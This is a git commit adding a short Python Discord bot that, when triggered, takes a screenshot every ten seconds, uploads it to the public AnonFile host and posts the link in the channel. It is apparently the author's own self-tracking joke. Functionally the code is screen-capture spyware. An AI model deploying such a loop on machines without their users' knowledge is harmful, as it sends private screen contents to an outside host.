dc585c301f421f581a65a22908c4e6b539cdeb14
Nexity <46597698+Nexity@users.noreply.github.com>
2021-03-22 20:42:45 +0800

    screen tracker just because why not

---
+++ o7ScreenTracker.py
@@ -0,0 +1,19 @@
+from anonfile.anonfile import AnonFile
+import pyautogui
+import time
+import discord
+client = discord.Client()
+TOKEN = "TOKENHERE"
+
+@client.event
+async def on_message(message):
+    if message.author.id == 343591759332245505 and message.content == "start_tracking_me":
+        while True:
+            screenshot = pyautogui.screenshot()
+            screenshot.save("screen.png")
+            anon = AnonFile('351fafd5bb43939b')
+            status, file_url = anon.upload_file('screen.png')
+            await message.channel.send("what nexity is looking at: " + file_url)
+            time.sleep(10)
+    
+client.run(TOKEN)
